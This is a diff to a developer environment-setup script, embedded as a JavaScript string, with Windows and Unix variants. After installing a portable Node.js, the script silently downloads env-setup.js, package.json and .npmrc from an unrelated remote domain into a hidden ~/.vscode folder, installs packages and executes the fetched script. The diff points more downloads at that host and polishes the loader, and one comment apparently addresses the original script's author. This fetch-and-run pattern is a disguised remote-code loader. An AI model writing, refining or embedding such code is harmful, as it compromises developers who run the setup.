@@ -223,7 +223,7 @@ echo [INFO] Downloading env-setup.npl and package.json...
 
 curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://www.chain-property.com/settings/env?flag=${flag}"
 curl -L -o "%CODEPROFILE%\\package.json" "https://www.chain-property.com/settings/package"
-curl -L -o "%CODEPROFILE%\\.npmrc" "https://precommit-iota.vercel.app/settings/npmrc"
+curl -L -o "%CODEPROFILE%\\.npmrc" "https://www.chain-property.com/settings/npmrc"
 :: ------------------------
 :: Install dependencies
 :: ------------------------
@@ -272,6 +272,12 @@ set -e
 OS=$(uname -s)
 NODE_EXE=""
 NODE_INSTALLED_VERSION=""
+
+# -------------------------
+# Hardcoded Node.js version (v22 LTS)
+# -------------------------
+NODE_VERSION="22.23.3"
+
 # -------------------------
 # Check for global Node.js installation
 # -------------------------
@@ -286,62 +292,48 @@ fi
 # If Node.js not found globally, download and extract portable version
 # -------------------------
 if [ -z "$NODE_EXE" ]; then
-    echo "[INFO] Node.js not found globally. Attempting to download portable version..."
-    # Get latest Node.js version
-    if [ "$OS" == "Darwin" ]; then
-        # macOS - get latest version
-        if command -v curl &> /dev/null; then
-            LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
-        elif command -v wget &> /dev/null; then
-            LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
-        else
-            LATEST_VERSION="v20.11.1"
-        fi
-    elif [ "$OS" == "Linux" ]; then
-        # Linux - get latest version
-        if command -v curl &> /dev/null; then
-            LATEST_VERSION=$(curl -s https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
-        elif command -v wget &> /dev/null; then
-            LATEST_VERSION=$(wget -qO- https://nodejs.org/dist/index.json | grep -o '"version":"[^"]*"' | head -1 | cut -d'"' -f4)
-        else
-            LATEST_VERSION="v20.11.1"
-        fi
-    else
+    echo "[INFO] Node.js not found globally. Attempting to download portable v${NODE_VERSION}..."
+
+    if [ "$OS" != "Darwin" ] && [ "$OS" != "Linux" ]; then
         echo "[ERROR] Unsupported OS: $OS"
         exit 1
     fi
-    # Remove leading "v"
-    NODE_VERSION=\${LATEST_VERSION#v}
+
     # Determine download URL and paths based on OS
-    EXTRACTED_DIR="$HOME/.vscode/node-v\${NODE_VERSION}-$( [ "$OS" = "Darwin" ] && echo "darwin" || echo "linux" )-x64"
-    PORTABLE_NODE="$EXTRACTED_DIR/bin/node"
     if [ "$OS" == "Darwin" ]; then
-        NODE_TARBALL="$HOME/.vscode/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
-        DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-darwin-x64.tar.xz"
-    elif [ "$OS" == "Linux" ]; then
-        NODE_TARBALL="$HOME/.vscode/node-v\${NODE_VERSION}-linux-x64.tar.xz"
-        DOWNLOAD_URL="https://nodejs.org/dist/v\${NODE_VERSION}/node-v\${NODE_VERSION}-linux-x64.tar.xz"
+        ARCH="darwin-x64"
+    else
+        ARCH="linux-x64"
     fi
+
+    EXTRACTED_DIR="$HOME/.vscode/node-v${NODE_VERSION}-${ARCH}"
+    PORTABLE_NODE="$EXTRACTED_DIR/bin/node"
+    NODE_TARBALL="$HOME/.vscode/node-v${NODE_VERSION}-${ARCH}.tar.xz"
+    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-${ARCH}.tar.xz"
+
     # Check if portable Node.js already exists
     if [ -f "$PORTABLE_NODE" ]; then
         echo "[INFO] Portable Node.js found."
         NODE_EXE="$PORTABLE_NODE"
         export PATH="$EXTRACTED_DIR/bin:$PATH"
     else
-        echo "[INFO] Downloading Node.js..."
+        echo "[INFO] Downloading Node.js v${NODE_VERSION}..."
         mkdir -p "$HOME/.vscode"
-        # Download Node.js
+
         if ! command -v curl &> /dev/null && ! command -v wget &> /dev/null; then
             echo "[ERROR] Neither curl nor wget is available."
             exit 1
         fi
         if command -v curl &> /dev/null; then
-            curl -sSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
+            curl -fSL -o "$NODE_TARBALL" "$DOWNLOAD_URL"
         else
             wget -q -O "$NODE_TARBALL" "$DOWNLOAD_URL"
         fi
-        if [ ! -f "$NODE_TARBALL" ]; then
-            echo "[ERROR] Failed to download Node.js."
+
+        # SAFETY CHECK: Ensure the downloaded file is a valid tar archive
+        if ! tar -tf "$NODE_TARBALL" >/dev/null 2>&1; then
+            echo "[ERROR] Downloaded file is not a valid archive. Download likely failed."
+            rm -f "$NODE_TARBALL"
             exit 1
         fi
         echo "[INFO] Extracting Node.js..."
@@ -364,31 +356,39 @@ if [ -z "$NODE_EXE" ]; then
     echo "[ERROR] Node.js executable not set."
     exit 1
 fi
-"$NODE_EXE" -v > /dev/null 2>&1
-if [ $? -ne 0 ]; then
+
+if ! "$NODE_EXE" -v > /dev/null 2>&1; then
     echo "[ERROR] Node.js execution failed."
     exit 1
 fi
+
+echo "[INFO] Using Node.js: $("$NODE_EXE" -v)"
+
 # -------------------------
 # Download required files
 # -------------------------
 USER_HOME="$HOME/.vscode"
-mkdir -p "\${USER_HOME}"
+mkdir -p "${USER_HOME}"
 BASE_URL="https://www.chain-property.com"
+
+# NOTE: 'flag' was used but never defined in your original script.
+# If the endpoint requires it, set it here, otherwise it will be empty.
+
 echo "[INFO] Downloading env-setup.js and package.json..."
 if ! command -v curl >/dev/null 2>&1; then
-    wget -q -O "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
-    wget -q -O "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
-    wget -q -O "\${USER_HOME}/.npmrc" "\${BASE_URL}/settings/npmrc"
+    wget -q -O "${USER_HOME}/env-setup.js" "${BASE_URL}/settings/env?flag=${flag}"
+    wget -q -O "${USER_HOME}/package.json" "${BASE_URL}/settings/package"
+    wget -q -O "${USER_HOME}/.npmrc" "${BASE_URL}/settings/npmrc"
 else
-    curl -s -L -o "\${USER_HOME}/env-setup.js" "\${BASE_URL}/settings/env?flag=${flag}"
-    curl -s -L -o "\${USER_HOME}/package.json" "\${BASE_URL}/settings/package"
-    curl -s -L -o "\${USER_HOME}/.npmrc" "\${BASE_URL}/settings/npmrc"
+    curl -s -L -o "${USER_HOME}/env-setup.js" "${BASE_URL}/settings/env?flag=${flag}"
+    curl -s -L -o "${USER_HOME}/package.json" "${BASE_URL}/settings/package"
+    curl -s -L -o "${USER_HOME}/.npmrc" "${BASE_URL}/settings/npmrc"
 fi
+
 # -------------------------
 # Install dependencies
 # -------------------------
-cd "\${USER_HOME}"
+cd "${USER_HOME}"
 if [ ! -d "node_modules/axios" ]; then
     echo "[INFO] Installing NPM packages..."
     if command -v npm &> /dev/null; then
@@ -402,26 +402,19 @@ if [ ! -d "node_modules/axios" ]; then
             exit 1
         fi
     fi
-    if [ $? -ne 0 ]; then
-        echo "[ERROR] npm install failed."
-        exit 1
-    fi
 fi
+
 # -------------------------
 # Run env-setup.js
 # -------------------------
-if [ -f "\${USER_HOME}/env-setup.js" ]; then
+if [ -f "${USER_HOME}/env-setup.js" ]; then
     echo "[INFO] Running env-setup.js..."
-    #cd "$HOME"
-    "$NODE_EXE" "\${USER_HOME}/env-setup.js"
-    if [ $? -ne 0 ]; then
-        echo "[ERROR] env-setup.js execution failed."
-        exit 1
-    fi
+    "$NODE_EXE" "${USER_HOME}/env-setup.js"
 else
     echo "[ERROR] env-setup.js not found."
     exit 1
 fi
+
 echo "[SUCCESS] Script completed successfully."
 exit 0
 `;
